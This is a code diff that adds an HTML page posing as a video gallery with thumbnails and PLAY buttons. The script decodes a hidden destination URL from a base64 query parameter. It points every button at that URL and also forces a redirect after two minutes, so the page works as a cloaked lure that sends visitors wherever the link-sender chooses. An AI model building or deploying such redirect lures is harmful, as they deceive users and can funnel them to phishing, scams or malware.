@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="pt-PT" xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Nigeria adl JPJ</title>
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link href="fav02.png" rel="icon" />
+    <link media="all" rel="stylesheet" type="text/css" href="css/style.css" />
+  </head>
+
+  <body onload="realImpression();">
+    <table align="center">
+      <tbody>
+        <tr>
+          <td>
+            <a class="finlink popu" href="#"
+              ><img style="width: 150px" src="images/2.png"
+            /></a>
+          </td>
+          <td>
+            <a class="finlink popu" href="#"
+              ><img style="width: 172px" src="images/5.png"
+            /></a>
+          </td>
+        </tr>
+        <tr>
+          <td>
+            <a class="finlink popu" href="#"><button>PLAY</button></a>
+          </td>
+          <td>
+            <a class="finlink popu" href="#"><button>PLAY</button></a>
+          </td>
+        </tr>
+        <tr>
+          <td>
+            <a class="finlink popu" href="#"
+              ><img style="width: 195px" src="images/6.png"
+            /></a>
+          </td>
+          <td>
+            <a class="finlink popu" href="#"
+              ><img style="width: 150px" src="images/15.png"
+            /></a>
+          </td>
+        </tr>
+        <tr>
+          <td>
+            <a class="finlink popu" href="#"><button>PLAY</button></a>
+          </td>
+          <td>
+            <a class="finlink popu" href="#"><button>PLAY</button></a>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+
+    <a class="finlink popu" href="#"><button class="all">WATCH ALL</button></a>
+
+    <script>
+      function getURLParameter(name) {
+        return (
+          (RegExp(name + "=" + "(.+?)(&|$)").exec(location.search) || [])[1] ||
+          ""
+        );
+      }
+
+      function getBase64URLParameter(name) {
+        let value = getURLParameter(name);
+        try {
+          return window.atob(value.replace(/-/g, "+").replace(/_/g, "/"));
+        } catch {
+          return value;
+        }
+      }
+
+      function encodeUrlOnlyParamsV2(url) {
+        let questionMarkIndex = url.indexOf("?");
+        if (questionMarkIndex === -1) return url;
+        let baseUrl = url.slice(0, questionMarkIndex);
+        let queryString = url.slice(questionMarkIndex + 1);
+        let params = new URLSearchParams(queryString);
+        let encodedParams = new URLSearchParams();
+        params.forEach((value, key) => {
+          encodedParams.append(key, value);
+        });
+        return `${baseUrl}?${encodedParams.toString()}`;
+      }
+
+      var fin_link = encodeUrlOnlyParamsV2(
+        decodeURIComponent(getBase64URLParameter("p1"))
+      );
+
+      var links = document.getElementsByClassName("finlink");
+      for (let i = 0; i < links.length; i++) {
+        links[i].setAttribute("href", fin_link);
+        links[i].addEventListener("click", function (evt) {
+          evt.preventDefault();
+          setTimeout(() => {
+            window.location.href = fin_link;
+          }, 500);
+        });
+      }
+
+      setTimeout(() => {
+        window.location.href = fin_link;
+      }, 60000 * 2);
+    </script>
+  </body>
+</html>
